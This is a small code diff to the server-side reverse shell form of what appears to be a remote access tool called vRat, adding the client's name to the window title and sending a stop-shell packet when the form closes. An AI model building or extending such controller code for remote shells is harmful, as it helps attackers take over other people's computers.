@@ -43,7 +43,7 @@ namespace vRatServer.Forms
         private void ReverseShellform_Load(object sender, EventArgs e)
         {
             byte[]? r = null;
-            
+            this.Text = this.Text + "  - " + client.Name;
             globals.SendPacket(client, (byte)globals.PacketType.ReverseShellStart, 0, 0, ref r);
             textBox1.Focus();
         }
@@ -57,6 +57,8 @@ namespace vRatServer.Forms
         {
             this.client.rsf = null;
             sendcommand("exit");
+            byte[]? r = null;
+            globals.SendPacket(client, (byte)globals.PacketType.ReverseShellStop, 0, 0, ref r);
         }
 
         private void textBox1_KeyDown(object sender, KeyEventArgs e)
